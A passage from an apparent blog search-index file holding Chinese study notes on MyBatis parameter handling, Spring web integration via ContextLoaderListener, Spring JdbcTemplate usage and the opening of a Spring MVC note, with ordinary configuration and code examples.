punctuation attr-equals">=</span><span class="token punctuation">"</span>orderTime<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>total<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>total<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collection</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作用：</p><ul><li>完成多表操作</li><li>解决 数据库表的字段名称和实体类的属性名称不一致，不能自动封装数据的问题</li></ul><h2 id="参数封装"><a href="#参数封装" class="headerlink" title="参数封装"></a>参数封装</h2><h3 id="单个参数："><a href="#单个参数：" class="headerlink" title="单个参数："></a>单个参数：</h3><ul><li><p>pojo 类型：直接使用，属性名和参数占位符名称一致</p></li><li><p>map 集合：直接使用，键名和参数站位福名称一致</p></li><li><p>Collection：封装为 map 集合，可以使用@Param 注解，替换 Map 集合中默认的 arg 键名</p><p>默认操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg0"</span><span class="token punctuation">,</span> collection集合<span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"collection"</span><span class="token punctuation">,</span> collection集合<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>List：封装为 map 集合</p><p>默认操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg0"</span><span class="token punctuation">,</span> list集合<span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"collection"</span><span class="token punctuation">,</span> collection集合<span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">,</span> list集合<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>Array：封装为 map 集合</p><p>默认操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg0"</span><span class="token punctuation">,</span> array数组<span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"array"</span><span class="token punctuation">,</span> array数组<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>其他类型：直接使用</p></li></ul><h3 id="多个参数："><a href="#多个参数：" class="headerlink" title="多个参数："></a>多个参数：</h3><p>封装为 map 集合，可以使用@Param 注解，替换 Map 集合中默认的 arg 键名</p><ul><li><p>默认操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg0"</span><span class="token punctuation">,</span> 参数值<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"param1"</span><span class="token punctuation">,</span> 参数值<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg1"</span><span class="token punctuation">,</span> 参数值<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"param2"</span><span class="token punctuation">,</span> 参数值<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若使用<code>@Param(&quot;username&quot;)</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> 参数值<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"param1"</span><span class="token punctuation">,</span> 参数值<span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"arg1"</span><span class="token punctuation">,</span> 参数值<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"param2"</span><span class="token punctuation">,</span> 参数值<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="参数接收"><a href="#参数接收" class="headerlink" title="参数接收"></a>参数接收</h2><p>参数占位符：</p><ul><li><p><code>$&#123;&#125;</code>：可能存在 sql 注入问题</p></li><li><p><code>#&#123;&#125;</code>：会将其替换为？，防止 sql 注入</p></li></ul><p>使用时机：</p><ul><li><p>参数传递的时候使用<code>#&#123;&#125;</code></p></li><li><p>表名或者列名不固定的情况：<code>$&#123;&#125;</code> （一般不用）</p></li></ul><p>​ 参数类型：parameterType：可以省略</p><p>特殊字符处理：</p><ul><li>转义字符</li><li><code>&lt;![CDATA[]]&gt;</code></li></ul><p>接收参数时注意：</p><ul><li>散装参数：如果方法中有多个参数，需要使用@Param(“sql 参数占位符名称”)</li><li>实体类封装参数：对象的属性名称要和参数占位符名称一致</li><li>map 集合：需要保证 sql 中的参数名和 map 集合的键的名称对应上</li></ul><h2 id="注解开发"><a href="#注解开发" class="headerlink" title="注解开发"></a>注解开发</h2><p>。。个人认为还是使用 xml 配置吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端，框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring集成web环境</title>
      <link href="/2022/03/27/spring%E9%9B%86%E6%88%90web%E7%8E%AF%E5%A2%83/"/>
      <url>/2022/03/27/spring%E9%9B%86%E6%88%90web%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>应用上下文对象是通过<code>new ClasspathXmlApplicationContext</code>(spring 配置文件) 方式获取的，但是每次从容器中获得 Bean 时都要编写 new ClasspathXmlApplicationContext(spring 配置文件) ，这样的弊端是配置文件加载多次，应用上下文对象创建多次。</p><p>在 Web 项目中，可以使用<code>ServletContextListener</code>监听 Web 应用的启动，我们可以在 Web 应用启动时，就加载 Spring 的配置文件，创建应用上下文对象<code>ApplicationContext</code>，在将其存储到最大的域<code>servletContext</code>域中，这样就可以在任意位置从域中获得应用上下文<code>ApplicationContext</code>对象了。</p><p>Spring 提供了一个监听器<code>ContextLoaderListener</code>就是对上述功能的封装，该监听器内部加载 Spring 配置文件，创建应用上下文对象，并存储到<code>ServletContext</code>域中，提供了一个客户端工具<code>WebApplicationContextUtils</code>供使用者获得应用上下文对象。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>导入 Spring 集成 web 的坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在 web.xml 中配置<code>ContextLoaderListener</code>监听器</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--全局参数--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>classpath:applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Spring的监听器--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">></span></span>    org.springframework.web.context.ContextLoaderListener    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过工具获取应用上下文对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token class-name">WebApplicationContextUtils</span><span class="token punctuation">.</span><span class="token function">getWebApplicationContext</span><span class="token punctuation">(</span>servletContext<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring-jdbc</title>
      <link href="/2022/03/27/spring-jdbc/"/>
      <url>/2022/03/27/spring-jdbc/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>它是 spring 框架中提供的一个对象，是对原始繁琐的 Jdbc API 对象的简单封装。spring 框架为我们提供了很多的操作模板类。例如：操作关系型数据的 JdbcTemplate 和 HibernateTemplate，操作 nosql 数据库的 RedisTemplate，操作消息队列的 JmsTemplate 等等。</p><h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><ol><li><p>导入<code>spring-jdbc</code>和<code>spring-tx</code>坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-jdbc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-tx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建数据库表和实体</p></li><li><p>创建 JdbcTemplate 对象</p></li><li><p>执行数据库操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1、创建数据源对象</span><span class="token class-name">ComboPooledDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ComboPooledDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setDriverClass</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setJdbcUrl</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://localhost:3306/test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//2、创建JdbcTemplate对象</span><span class="token class-name">JdbcTemplate</span> jdbcTemplate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//3、设置数据源给JdbcTemplate</span>jdbcTemplate<span class="token punctuation">.</span><span class="token function">setDataSource</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//4、执行操作</span>jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert into account values(?,?)"</span><span class="token punctuation">,</span><span class="token string">"tom"</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以将 JdbcTemplate 的创建权交给 Spring，将数据源 DataSource 的创建权也交给 Spring，在 Spring 容器内部将数据源 DataSource 注入到 JdbcTemplate 模版对象中，配置如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--数据源DataSource--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mchange.v2.c3p0.ComboPooledDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql:///test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--JdbcTemplate--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcTemplate<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.springframework.jdbc.core.JdbcTemplate<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从容器中获得 JdbcTemplate 进行添加操作</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSpringJdbcTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">PropertyVetoException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ApplicationContext</span> applicationContext <span class="token operator">=</span> <span class="token keyword">new</span>    <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">JdbcTemplate</span> jdbcTemplate <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">JdbcTemplate</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert into account values(?,?)"</span><span class="token punctuation">,</span><span class="token string">"lucy"</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ul><li><p>update()：执行 DML 语句。增删改。</p></li><li><p>queryForMap()：查询结果，将结果集封装为 Map 集合，将列名作为 key，值作为 value</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from emp where id = ? or id = ?"</span><span class="token punctuation">;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">queryForMap</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token number">1001</span><span class="token punctuation">,</span><span class="token number">1002</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这个方法查询的结果集长度只能是 1</p></blockquote></li><li><p>queryForList()：查询结果，将结果集封装为一个 list 集合</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from emp"</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span><span class="token punctuation">></span></span> list <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">queryForList</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> stringObjectMap <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stringObjectMap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>将每一条记录封装为一个 Map 集合，再将 Map 集合装载到 List 集合中</p></blockquote></li><li><p>query()：查询结果，将结果集封装为 JavaBean 对象</p><p>参数：<code>RowMapper</code></p><ul><li>一般我们使用<code>BeanPropertyRowMapper</code>实现类，可以完成数据到 JavaBean 的自动封装</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from emp"</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Emp</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BeanPropertyRowMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Emp</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">Emp</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Emp</span> emp <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>emp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>queryForObject()：查询结果，将结果封装为对象</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select count(id) from emp"</span><span class="token punctuation">;</span>    <span class="token class-name">Long</span> total <span class="token operator">=</span> template<span class="token punctuation">.</span><span class="token function">queryForObject</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一般用于聚合函数的查询</p></blockquote></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring_mvc</title>
      <link href="/2022/03/26/spring-mvc/"/>
      <url>/2022/03/26/spring-mvc/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SpringMVC 是一种基于 Java 的实现 MVC 设计模型的请求驱动类型的轻量级 Web 框架，属于<br>SpringFrameWork 的后续产品，已经融合在 Spring Web Flow 中。<br>SpringMVC 已经成为目前最主流的 MVC 框架之一，并且随着 Spring3.0 的发布，全面超越 Struts2，成为最优秀的 MVC 框架。它通过一套注解，让一个简单的 Java 类成为处理请求的控制器，而无须实现任何接口。同时它还支持 RESTful 编程风格的请求。</p><h2 id="开发步骤"><a href="#开发步骤" class="headerlink" title="开发步骤"></a>开发步骤</h2><p>客户端发起请求，服务器接收请求，执行逻辑并进行视图跳转</p><ol><li><p>导入 spring-mvc 相关坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--Spring坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--SpringMVC坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    